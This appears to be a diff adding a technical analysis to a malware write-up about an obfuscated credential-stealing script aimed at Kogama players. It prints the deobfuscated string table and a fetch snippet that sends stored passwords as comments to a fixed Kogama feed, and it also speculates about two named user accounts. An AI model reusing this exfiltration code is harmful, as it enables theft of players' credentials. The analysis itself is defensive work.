@@ -29,3 +29,55 @@ The script exhibits several red flags:
    const _0x1a7136=['addEventListener','getElementById','application/json','https://www.kogama.com/auth/logout'] // Getting an element by ID and logging us out
    ```
 
+# Technical Analysis
+
+### Initial Deobfuscation
+The script employs heavy obfuscation with several immediate red flags:
+
+```javascript
+function _0x22fc() {
+  const _0x1a7136 = [
+    'addEventListener', 'log', 'stringify', 'location', 'status', 
+    '173846mcQEUN', '9NpMVeb', 'Success:', '113830LYAXum', 'keyCode',
+    'setItem', 'value', 'root-page-mobile', 'password', '71868QrEQBX',
+    'getItem', 'error', '2716758eSaPId', 'catch', 'poop',
+    'querySelector', 'Error:', '126544zlfMyY', 'lol', '506569BqwGkp',
+    '.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textDefault...',
+    '99qjFQGn', '2MXeZit', 'then', 'getElementById', 'application/json',
+    'https://www.kogama.com/auth/logout', '25vivdkf', 'json',
+    "Button not found!", '768536FEIJoG', 'POST', 'click',
+    '.MuiButtonBase-root.MuiButton-root.MuiButton-contained...',
+    "background-image: linear-gradient(135deg, rgb(0 137 255), rgb(0 112 255))"
+  ];
+  _0x22fc = function() { return _0x1a7136; };
+  return _0x22fc();
+}
+```
+
+###  Key Malicious Behaviors
+
+1. **Anomalous Code Patterns**
+   - Sets a localStorage variable named 'poop' to store passwords
+   - Calls logout function (https://www.kogama.com/auth/logout) to force re-authentication
+
+2. **Data Exfiltration**
+   - Transmits stolen credentials as a "comment" to a fixed Kogama.com feed ID
+   - You can view the current state of comments from this object [here](https://www.kogama.com/api/feed/31872096/comment/)
+   - If you want to go a few steps ahead, you can compare your findings to what I've saved @ [May 31, 2025 20:24](https://github.com/vendicatedcore/kgmmlwr/blob/main/Lavar/Script/endpoint/comments.json)
+```javascript
+fetch('https://www.kogama.com/api/feed/31872096/comment/', {
+  'method': _0x5acfe3(0x1f3),  // Resolves to 'POST'
+  'headers': {
+    'Content-Type': _0x5acfe3(0x1ed)  // Resolves to 'application/json'
+  },
+  'body': JSON[_0x5acfe3(0x1f9)]({  // Resolves to 'stringify'
+    'comment': localStorage[_0x5acfe3(0x206)](_0x5acfe3(0x1e2))  // Gets 'password'
+  })
+```
+
+As of [May 31, 2025 20:24](https://github.com/vendicatedcore/kgmmlwr/blob/main/Lavar/Script/endpoint/comments.json) the only accounts that have posted any comments under this specific Object are [GameCodeMaster](https://www.kogama.com/profile/670030842/) and a dummy account @ [Boris Jacob Anderson](https://www.kogama.com/profile/670351929/). Both of those have already changed passwords which could mean two twings. 
+Either the person behind this script is GameCodeMaster simply testing their own sample, or that account has been stolen because of their naive traits.
+Why such theory? GameCodeMaster is an owner of 'Tester' Badge, which these days - isn't rare, but it just may be an indicator.
+
+What of the post/feed that stores the comments? - I'm still trying to locate it, trying to finalise the investigation.
+No hits in unpublished projects, deleted maps or anywhere else.
